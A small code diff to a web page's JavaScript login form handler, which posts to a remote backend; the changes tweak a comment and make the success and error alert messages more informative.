@@ -6,7 +6,6 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 
   try {
     const response = await fetch('https://instalogin-backend.onrender.com/login', {
-
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -16,13 +15,13 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 
     if (response.ok) {
       alert('Login Successful! Redirecting...');
-      window.location.href = 'index.html'; // Adjust if needed
+      window.location.href = 'index.html'; // You can change this if needed
     } else {
       const error = await response.json();
-      alert(`Login failed: ${error.error}`);
+      alert(`❌ Login failed: ${error.error || 'Unknown error'}`);
     }
   } catch (err) {
     console.error('❌ Request Error:', err);
-    alert('Something went wrong. Check console.');
+    alert(`❌ Request failed: ${err.message}`);
   }
 });
